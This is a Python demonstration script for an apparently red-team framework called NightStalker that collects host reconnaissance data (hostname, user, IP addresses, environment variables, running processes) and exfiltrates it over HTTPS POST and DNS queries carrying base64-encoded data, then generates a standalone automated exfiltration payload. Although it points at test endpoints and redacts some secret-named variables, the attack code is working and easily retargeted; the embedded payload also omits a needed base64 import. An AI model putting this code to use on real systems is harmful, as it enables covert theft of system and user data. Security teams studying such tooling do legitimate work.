#!/usr/bin/env python3
"""
NightStalker Exfiltration Example
Demonstrates how to exfiltrate reconnaissance data using various channels
"""

import sys
import os
import json
import base64
import time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'nightstalker'))

from redteam.exfiltration import CovertChannels
from redteam.payload_builder import PayloadBuilder

def gather_recon_data():
    """Gather system reconnaissance data"""
    import platform
    import socket
    import subprocess
    
    print("🔍 Gathering reconnaissance data...")
    
    # System information
    system_info = {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'python_version': platform.python_version(),
        'architecture': platform.architecture(),
        'processor': platform.processor(),
        'current_user': os.getenv('USERNAME', os.getenv('USER', 'Unknown')),
        'current_dir': os.getcwd(),
        'timestamp': time.time()
    }
    
    # Network information
    try:
        # Get IP addresses
        hostname = socket.gethostname()
        ip_addresses = []
        for info in socket.getaddrinfo(hostname, None):
            ip_addresses.append(info[4][0])
        system_info['ip_addresses'] = list(set(ip_addresses))
    except Exception as e:
        system_info['ip_addresses'] = [f"Error: {e}"]
    
    # Environment variables (filtered)
    env_vars = {}
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'CREDENTIAL']
    for key, value in os.environ.items():
        if any(sensitive in key.upper() for sensitive in sensitive_keys):
            env_vars[key] = '[REDACTED]'
        else:
            env_vars[key] = value
    system_info['environment'] = env_vars
    
    # Running processes (sample)
    try:
        if os.name == 'nt':  # Windows
            result = subprocess.run(['tasklist', '/FO', 'CSV'], 
                                  capture_output=True, text=True, timeout=10)
            processes = result.stdout.split('\n')[:10]  # First 10 processes
        else:  # Linux/Mac
            result = subprocess.run(['ps', 'aux'], 
                                  capture_output=True, text=True, timeout=10)
            processes = result.stdout.split('\n')[:10]  # First 10 processes
        system_info['processes'] = processes
    except Exception as e:
        system_info['processes'] = [f"Error: {e}"]
    
    print(f"✅ Gathered {len(json.dumps(system_info))} bytes of reconnaissance data")
    return system_info

def exfiltrate_data(data, channels=None):
    """Exfiltrate data using specified channels"""
    print(f"🚀 Starting exfiltration using channels: {channels or 'all'}")
    
    # Initialize exfiltration module
    exfil = CovertChannels()
    
    # Convert data to bytes
    data_bytes = json.dumps(data, indent=2).encode('utf-8')
    
    # Configure channels
    channel_configs = {
        'https': {
            'target_url': 'https://httpbin.org/post',  # Test endpoint
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
        },
        'dns': {
            'dns_server': '8.8.8.8',
            'domain': 'example.com'
        }
    }
    
    # Perform exfiltration
    results = exfil.exfiltrate_data(
        data=data_bytes,
        channels=channels or ['https', 'dns'],
        channel_configs=channel_configs
    )
    
    # Report results
    print("\n📊 Exfiltration Results:")
    for channel, success in results.items():
        status = "✅ SUCCESS" if success else "❌ FAILED"
        print(f"  {channel.upper()}: {status}")
    
    return results

def create_exfil_payload():
    """Create a payload that automatically exfiltrates data"""
    print("🔧 Creating exfiltration payload...")
    
    # Create payload builder
    builder = PayloadBuilder()
    
    # Exfiltration payload code
    exfil_code = '''
import sys
import os
import json
import time
import platform
import socket
import subprocess

def gather_and_exfil():
    """Gather system data and exfiltrate it"""
    print("NightStalker Exfiltration Payload")
    print("=" * 40)
    
    # Gather system information
    system_info = {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'python_version': platform.python_version(),
        'current_user': os.getenv('USERNAME', os.getenv('USER', 'Unknown')),
        'current_dir': os.getcwd(),
        'timestamp': time.time()
    }
    
    # Get network info
    try:
        hostname = socket.gethostname()
        ip_addresses = []
        for info in socket.getaddrinfo(hostname, None):
            ip_addresses.append(info[4][0])
        system_info['ip_addresses'] = list(set(ip_addresses))
    except Exception as e:
        system_info['ip_addresses'] = [f"Error: {e}"]
    
    # Get environment variables (filtered)
    env_vars = {}
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'CREDENTIAL']
    for key, value in os.environ.items():
        if any(sensitive in key.upper() for sensitive in sensitive_keys):
            env_vars[key] = '[REDACTED]'
        else:
            env_vars[key] = value
    system_info['environment'] = env_vars
    
    print(f"Gathered reconnaissance data: {len(json.dumps(system_info))} bytes")
    
    # Simulate exfiltration (in real scenario, this would use the exfiltration module)
    print("Simulating exfiltration via multiple channels...")
    
    # HTTPS exfiltration simulation
    try:
        import urllib.request
        import urllib.parse
        
        data = json.dumps(system_info).encode('utf-8')
        req = urllib.request.Request(
            'https://httpbin.org/post',
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        print(f"✅ HTTPS exfiltration: {response.getcode()}")
    except Exception as e:
        print(f"❌ HTTPS exfiltration failed: {e}")
    
    # DNS exfiltration simulation
    try:
        import socket
        # Create a DNS query with encoded data
        encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode()
        query = f"{encoded_data[:50]}.example.com"  # Truncate for DNS limits
        socket.gethostbyname(query)
        print("✅ DNS exfiltration: Query sent")
    except Exception as e:
        print(f"❌ DNS exfiltration failed: {e}")
    
    print("Exfiltration payload completed")

def main():
    gather_and_exfil()

if __name__ == "__main__":
    main()
'''
    
    # Build the payload
    output_path = builder.build_payload(
        payload_type="exfiltration",
        payload_code=exfil_code,
        output_format="python",
        metadata={'description': 'Automated reconnaissance and exfiltration payload'}
    )
    
    print(f"✅ Exfiltration payload created: {output_path}")
    return output_path

def main():
    """Main demonstration function"""
    print("🌙 NightStalker Exfiltration Demonstration")
    print("=" * 50)
    
    # Option 1: Manual exfiltration
    print("\n1️⃣ Manual Exfiltration Example:")
    recon_data = gather_recon_data()
    
    # Show what we gathered
    print(f"\n📋 Reconnaissance Data Preview:")
    print(json.dumps(recon_data, indent=2)[:500] + "...")
    
    # Exfiltrate the data
    results = exfiltrate_data(recon_data, channels=['https'])
    
    # Option 2: Create automated payload
    print("\n2️⃣ Automated Exfiltration Payload:")
    payload_path = create_exfil_payload()
    
    print(f"\n🎯 To run the exfiltration payload:")
    print(f"   python {payload_path}")
    
    # Option 3: CLI usage
    print("\n3️⃣ Using NightStalker CLI:")
    print("   python -m nightstalker.cli exfil --data recon_data.json --channels https dns")
    
    print("\n✨ Exfiltration demonstration completed!")

if __name__ == "__main__":
    main() 